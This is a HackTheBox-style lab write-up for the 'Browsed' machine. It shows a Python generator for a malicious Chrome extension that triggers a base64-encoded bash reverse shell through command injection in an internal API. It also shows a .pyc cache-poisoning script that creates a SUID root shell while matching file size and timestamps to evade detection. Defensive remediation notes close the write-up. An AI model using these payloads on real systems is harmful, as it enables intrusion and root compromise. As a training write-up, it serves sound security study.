---
title: Browsed
os: Linux
difficulty: Medium
tags:
  - Chrome Extension
  - Command Injection
  - Python Cache Poisoning
  - SUID
  - Privilege Escalation
date: 2026-01-11
---

# 🛡️ HTB - Browsed (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Browsed
- **Operating System:** Linux
- **Difficulty:** Medium
- **Date of Scan:** 2026-01-11
- **Vulnerabilities:** Chrome Extension RCE (`--no-sandbox`), Python `.pyc` Cache Poisoning, SUID Privilege Escalation

---

## Step 1 - Reconnaissance

Will Use Namp To Se what Port And Services are Open

```bash
nmap -A -sS -Pn -T4  --min-rate 3000 10.10.8.1
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-11 13:29 UTC
Nmap scan report for 10.10.8.1
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Browsed
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/11%OT=22%CT=1%CU=41536%PV=Y%DS=2%DC=T%G=Y%TM=6963
OS:A5DC%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5
OS:=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
OS:FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=N)T1(R=Y
OS:%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   262.15 ms 10.10.14.1
2   245.60 ms 10.10.8.1

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.34 seconds
```

- 🔍 *Important Findings as Usual For Linux machines port 22 SSH and Port 80 Web.*

## Step 2 - Enumeration

- 🔍 *When we look at the web, it seems that this is a web for Extensions for google chrome of target, and like creating custom extensions.*
- 🔍 *Important Finding on Web is, an Upload.php Module. which let us upload a .zip file.*

- 🔍 *Request- Response*

#### [$] Upload Intercepted request

```http
POST /upload.php HTTP/1.1
Host: browsed.htb
Content-Length: 5530
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://browsed.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG3rd5TKGQZVw0f5C
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://browsed.htb/upload.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=udcddsjl03uchhs2p7loo75527
Connection: close

------WebKitFormBoundaryG3rd5TKGQZVw0f5C
Content-Disposition: form-data; name="extension"; filename="1042.zip"
Content-Type: application/zip
```

#### [$] Intercepted Response

```http
HTTP/1.1 302 Found
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 11 Jan 2026 14:11:01 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: upload.php
Content-Length: 381

Running command: timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox --load-extension="/tmp/extension_6963af6bc90878.15333689" --remote-debugging-port=0 --disable-extensions-except="/tmp/extension_6963af6bc90878.15333689" --enable-logging=stderr --v=1 http://localhost/ http://browsedinternals.htb 2>&1 |tee /tmp/extension_6963af6bc90878.15333689/output.log
```

- 🔍 *When you closely look at the response, you'll understand certain things like....*

> [!NOTE]
> **Dynamic Behavior:**
> - You POST a ZIP file to /upload.php, Server receives it and saves it temporarily
> - Extracts it to: /tmp/extension_6963af6bc90878.15333689/
> - (The random string 6963af6bc90878.15333689 is likely generated per upload)

> [!TIP]
> **Execution Parameters:**
> - timeout 10s: Limits execution to 10 seconds
> - xvfb-run: Runs Chrome in a virtual framebuffer (headless mode)
> - Chrome binary: /opt/chrome-linux64/chrome (custom Chrome install)

##### Flags:
- `--disable-gpu`: No GPU acceleration
- `--no-sandbox`: DANGEROUS - disables Chrome security sandbox
- `--load-extension`: Loads YOUR uploaded extension
- `--remote-debugging-port=0`: Auto-assign debug port (currently 0 = disabled)
- `--disable-extensions-except`: Only your extension is enabled
- `--enable-logging=stderr --v=1`: Verbose logging
- `URLs visited`: http://localhost/ and http://browsedinternals.htb
- `Output`: Redirected to log file in your extension directory

> [!WARNING]
> **Critical Security Issues:**
> - Command Injection Vector: The extracted path includes user-controlled filename
> - No Input Sanitization: Filename directly used in shell command
> - Information Disclosure: Full command shown in response
> - Unsafe Chrome Execution: --no-sandbox flag is extremely dangerous
> - Extension Privileges: Your extension gets access to internal URLs

> [!IMPORTANT]
> **Attack Plan:**
> - will create a malicious .zip file containing a reverse shell payload
> - will send it to server 
> - server will extract it
> - then server will load the manifest file as extension in browser
> - And Server executes the Malicious reverse shell code.

## Step 3 - Initial Foothold

> [!NOTE]
> Create a python script for creating a crafted zip file with reverse shell payload

```python
import zipfile
import io
import base64

def create_shell_extension(my_ip, my_port="9001"):
    zip_buffer = io.BytesIO()
    
    # 1. The Reverse Shell One-Liner (Standard Bash)
    # We encode it to avoid breaking the JSON or the URL string
    raw_shell = f"bash -i >& /dev/tcp/{my_ip}/{my_port} 0>&1"
    b64_shell = base64.b64encode(raw_shell.encode()).decode()
    
    # This is the payload that will be executed on the server
    # It decodes itself and pipes into bash
    shell_payload = f"echo${{IFS}}{b64_shell}|base64${{IFS}}-d|bash"

    # 2. Manifest V3
    manifest = '''{
        "manifest_version": 3,
        "name": "Security Optimizer",
        "version": "1.1",
        "background": {
            "service_worker": "background.js"
        },
        "host_permissions": ["*://127.0.0.1/*", "*://localhost/*"]
    }'''

    # 3. background.js
    # We will try both the routine path and a potential root injection
    background = f'''
    const ip = "{my_ip}";
    const payload = "{shell_payload}";
    
    // We send it via a background loop to ensure it fires
    async function triggerShell() {{
        const urls = [
            `http://127.0.0.1:5000/routines/a[$(${{payload}})]`,
            `http://127.0.0.1:5000/routines/a';${{payload}} #`
        ];

        for (const url of urls) {{
            fetch(url, {{ mode: 'no-cors' }});
        }}
    }}

    triggerShell();
    '''

    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("manifest.json", manifest)
        zip_file.writestr("background.js", background)

    with open("shell_exploit.zip", "wb") as f:
        f.write(zip_buffer.getvalue())

    print(f"[+] shell_exploit.zip created.")
    print(f"[+] Listener command: nc -lvnp {my_port}")
    print(f"[+] Encoded payload: {shell_payload}")

if __name__ == "__main__":
    # Change this to your HTB Tun0 IP
    create_shell_extension("10.10.*.*", "4444")
```

> [!NOTE]
> - This will generate a shell_payload.zip file
> - Setup a netcat listener
> - upload the zip file 
> - On the listener you'll see something like this 

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.221] from (UNKNOWN) [10.10.8.1] 52504
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ 
```

## Step 4 - Privilege Escalation

- 🔍 *sudo -l*

```text
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

here we can see that there is extension_tool.py file this current user can execute.

- 🔍 *While Analyzing the extension_tool.py utility, we can say it is a  browser extension packaging tool that validates, version-bumps, and packages Chrome/Firefox extensions.*
- 🔍 *In the same Directory there is another file named extension_util.py is a Quality control module that validates extension manifests and cleans up temporary files.*
- 🔍 *Also in while analysis of these modules i saw that we can replace the compiled python file .pyc with a crafted file which will run command as root*

- 🔍 *Exploit*

```python
#!/usr/bin/env python3
"""
Python .pyc Cache Poisoning Exploit
Target: /opt/extensiontool/extension_utils.py
Creates SUID bash shell at /tmp/rootbash
"""

import os
import py_compile
import shutil
import sys

# Target paths
ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

print("[*] Starting .pyc cache poisoning attack")
print(f"[*] Target: {TARGET_PYC}")

# Step 1: Get original file statistics
try:
    stat = os.stat(ORIGINAL_SRC)
    target_size = stat.st_size
    print(f"[+] Original file size: {target_size} bytes")
except FileNotFoundError:
    print(f"[-] Error: {ORIGINAL_SRC} not found!")
    sys.exit(1)

# Step 2: Create malicious payload
print("[*] Crafting malicious payload...")
payload = '''import os

def validate_manifest(path):
    """Malicious replacement - creates SUID bash shell"""
    os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
    print("[!] SUID bash created at /tmp/rootbash")
    return {"manifest_version": 3, "name": "placeholder", "version": "1.0.0"}

def clean_temp_files(arg):
    """Dummy function to avoid errors"""
    pass
'''

# Step 3: Match file size exactly (evasion)
padding_needed = target_size - len(payload)
if padding_needed > 0:
    payload += "#" * padding_needed
    print(f"[+] Added {padding_needed} bytes of padding")
else:
    print(f"[!] Payload larger than original by {-padding_needed} bytes")

# Step 4: Write malicious source file
with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)
print(f"[+] Malicious source written to {MALICIOUS_SRC}")

# Step 5: Preserve timestamps (evasion)
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))
print("[+] Timestamps synchronized")

# Step 6: Compile to .pyc
print("[*] Compiling malicious .pyc file...")
try:
    py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc")
    print("[+] Malicious .pyc compiled successfully")
except Exception as e:
    print(f"[-] Compilation failed: {e}")
    sys.exit(1)

# Step 7: Backup original .pyc (optional)
if os.path.exists(TARGET_PYC):
    backup_path = f"/tmp/extension_utils_backup_{os.getpid()}.pyc"
    shutil.copy(TARGET_PYC, backup_path)
    print(f"[+] Original .pyc backed up to {backup_path}")

# Step 8: Inject malicious .pyc
print(f"[*] Injecting into {TARGET_PYC}...")
try:
    if os.path.exists(TARGET_PYC):
        os.remove(TARGET_PYC)
    shutil.copy("/tmp/malicious.pyc", TARGET_PYC)
    
    # Verify injection
    if os.path.exists(TARGET_PYC):
        injected_size = os.path.getsize(TARGET_PYC)
        print(f"[✅] SUCCESS: .pyc file poisoned ({injected_size} bytes)")
        print("[*] Next: Wait for root to execute extension.py")
        print("[*] Then run: /tmp/rootbash -p")
    else:
        print("[-] ERROR: Injection failed")
        
except PermissionError:
    print("[-] PERMISSION DENIED: Cannot write to target directory")
    print("[-] Try: ls -la /opt/extensiontool/__pycache__/")
    sys.exit(1)
except Exception as e:
    print(f"[-] Injection failed: {e}")
    sys.exit(1)
```

- 🔍 *This exploit will replace the extentsion_util.py file with our malicious file, in which we have copied the /bin/bash as rootbash*
- 🔍 *Run the above script with python3.12 /tmp/malicious.py*
- 🔍 *Then Use the tool with---> sudo /opt/extension/extension_tool.py --ext Fonity /tmp/rootbash -p (Fontify is a pre-build extension in the directory)*
- 🔍 *ROOT ACCESS GAINED [*]*

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and structural misconfiguration exploited in the Browsed system. Each vulnerability is mapped to its core risk, threat impact, and practical defensive remediation strategies.

### 🔴 Unsafe Headless Google Chrome Execution with `--no-sandbox` Flag

> [!WARNING]
> **Vulnerability Profile:**
> The backend server processes dynamic user-submitted ZIP extensions and loads them inside a headless Google Chrome framework launched with the `--no-sandbox` flag to validate assets.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> The Chrome Sandbox is a vital kernel security boundary designed to keep web executions isolated from the host operating system. Running Google Chrome with the `--no-sandbox` flag disables this host isolation entirely. A malicious extension (utilizing standard chrome service workers like `background.js`) can easily invoke arbitrary JavaScript, access localhost loops, bypass cors constraints, or directly interact with insecure internal microservices, resulting in instant server compromise.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove the `--no-sandbox` flag immediately. If operating headless Chrome within constrained virtualization layers (such as standard Docker containers), use secure sandboxed container interfaces (e.g., **Google gVisor**, **Kata Containers**) or implement secure namespace isolation policies rather than disabling Chrome's internal engine sandbox.
> - **Remediation:** Enforce strict file checking. Avoid loading arbitrary user extensions directly in active browsers. If dynamic parsing is required, perform isolated static manifest analyses rather than dynamic browser executions.
> - **Detection:** Set up host system monitors (like EDR or Auditd) to alert on browser command flags (`--no-sandbox`, `--disable-gpu-sandbox`). Create immediate alerts if any browser child process executes OS shells (`/bin/sh`, `/bin/bash`).

---

### 🔴 Unsanitized Internal Input / Command Injection in Routines API (Port 5000)

> [!WARNING]
> **Vulnerability Profile:**
> The private internal Routines microservice listening on `127.0.0.1:5000` evaluates path input under the `/routines/` route dynamically, leaving it highly vulnerable to command injection payloads.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Even if a service is restricted to localhost loopback, it remains highly exposed to client-side requests originating from internal system applications (such as headless Chrome). Because the service directly evaluates URLs like `/routines/a[$(${{payload}})]` in a shell context without parameter separation, attackers can bypass boundary limits and execute arbitrary system processes with the permissions of the Routines daemon.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Replace shell processing wrappers (such as `os.system` or `subprocess.Popen(..., shell=True)`) with safe, parameter-based libraries. Avoid string concatenation when forming shell execution instructions.
> - **Remediation:** Employ strict internal traffic filtering. Configure local firewall systems (`iptables` / `nftables`) to block the headless Chrome runtime user from reaching local development/API ports (like port 5000) unless explicitly mandated.
> - **Detection:** Analyze local API query logs for command symbols (`;`, `&`, `|`, `$()`, `IFS`) in URI paths or request parameters.

---

### 🟡 Excessive Sudo Privilege Assignment without Passwords

> [!WARNING]
> **Vulnerability Profile:**
> The host `/etc/sudoers` file permits the low-privilege developer account `larry` to run the administrative script `/opt/extensiontool/extension_tool.py` as root without providing any password (`NOPASSWD`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Delegating passwordless root execution to customized scripts expands the administrative attack surface. If the permitted Python script accesses system folders, imports dynamic packages from shared directories, or executes child systems, standard system users can exploit these structures to hijack execution flow and acquire immediate root access.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Adhere to the Principle of Least Privilege. Avoid delegating blanket sudoers authorization to highly customized development scripts. Ensure that all folders, scripts, and libraries referenced in administrative pathways are owned strictly by `root:root` and are entirely read-only (`755` / `644`) to lower-privileged accounts.
> - **Detection:** Track all administrative sudo operations via syslog or system security audits. Configure immediate alerts for non-standard utility files executed under sudo privileges by service accounts.

---

### 🔴 Python `.pyc` Bytecode Cache Poisoning via Writable `__pycache__`

> [!WARNING]
> **Vulnerability Profile:**
> The compiler optimization subdirectory `/opt/extensiontool/__pycache__/` has loose file permission structures, allowing standard users like `larry` to overwrite or write to pre-compiled `.pyc` files.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> When the master script (`extension_tool.py`) is run as `root` and imports a library (like `extension_utils.py`), the Python runtime automatically loads the optimized pre-compiled bytecode (`.pyc`) from the `__pycache__` folder if it is present and matches the original source file's size and timestamp. Since low-privilege accounts can poison this bytecode file, they can inject arbitrary commands (such as copying `/bin/bash` with SUID permissions) that will run as `root` the moment the master script is executed, completely subverting source file code integrity.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Lock directory permission sets. Secure the main library folders and the `__pycache__` subfolders to be owned exclusively by `root:root` with write permissions restricted solely to administrators.
> - **Remediation:** Enforce standard interpreter controls. Execute sensitive administrative Python tools using the `-B` interpreter flag, or configure the system environment variable `PYTHONDONTWRITEBYTECODE=1` to prevent the use or creation of `.pyc` cache caches.
> - **Detection:** Monitor compiled cache folders for any modifications made by non-root system identifiers. Run regular baseline compliance scans (using tools like Samhain, AIDE, or custom cron scripts) to detect dynamic directory changes in application libraries.
